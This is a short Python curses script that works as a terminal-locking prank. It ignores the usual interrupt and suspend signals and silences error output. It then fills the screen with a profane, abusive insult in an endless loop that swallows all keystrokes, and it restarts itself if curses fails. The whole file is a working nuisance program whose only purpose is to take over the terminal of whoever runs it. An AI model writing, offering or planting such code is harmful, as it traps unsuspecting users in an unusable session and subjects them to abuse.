#!/usr/bin/env python3
import curses
import signal
import sys
import os

def block_signals():
    """Block common exit signals"""
    signal.signal(signal.SIGINT, signal.SIG_IGN)   # Ctrl+C
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)  # Ctrl+Z
    signal.signal(signal.SIGQUIT, signal.SIG_IGN)  # Ctrl+\

def lock_screen(stdscr):
    """Main lock screen function"""
    # Hide cursor
    curses.curs_set(0)
    
    # Get screen dimensions
    height, width = stdscr.getmaxyx()
    
    # Calculate center position
    message = "Get fucked bitch"
    x = width // 2 - len(message) // 2
    y = height // 2
    
    # Disable input echo and enable keypad
    curses.noecho()
    curses.cbreak()
    stdscr.keypad(True)
    
    # Set nodelay to prevent blocking
    stdscr.nodelay(True)
    
    while True:
        # Clear and refresh
        stdscr.clear()
        stdscr.bkgd(' ', curses.color_pair(0))
        
        # Display message in center
        try:
            stdscr.addstr(y, x, message, curses.A_BOLD)
        except curses.error:
            # Handle terminal too small
            stdscr.addstr(0, 0, message, curses.A_BOLD)
        
        stdscr.refresh()
        
        # Consume any input to prevent buffer overflow
        try:
            stdscr.getch()
        except:
            pass

def main():
    # Block all exit signals before starting
    block_signals()
    
    # Redirect stderr to devnull to suppress error messages
    sys.stderr = open(os.devnull, 'w')
    
    try:
        # Start curses and run lock screen
        curses.wrapper(lock_screen)
    except:
        # If curses fails, restart
        main()

if __name__ == "__main__":
    main()
